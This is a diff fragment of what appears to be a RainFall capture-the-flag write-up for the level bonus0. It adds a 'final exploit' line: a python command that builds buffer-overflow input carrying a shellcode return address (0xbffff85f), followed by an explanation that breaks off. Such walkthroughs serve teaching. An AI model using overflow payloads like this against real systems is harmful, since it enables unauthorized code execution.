@@ -259,4 +259,7 @@ So we have shellcode prepared, address 0xbffff85f to be inserted that is \x5f\xf
 We can come to main only with the help of buffer. Buffer is filled with data in `p` function. Let's try from this side. In order to show how final result works we will give the final answer and explain it and then show in gdb.\
 Final exploit:
 
-	bon
+	bonus0@RainFall:~$ python -c 'print "0" * 4095 + "\n" + "123456789" + "\x5f\xf8\xff\xbf" + "0" * 7' > /tmp/bonus0
+
+Where:
+* f
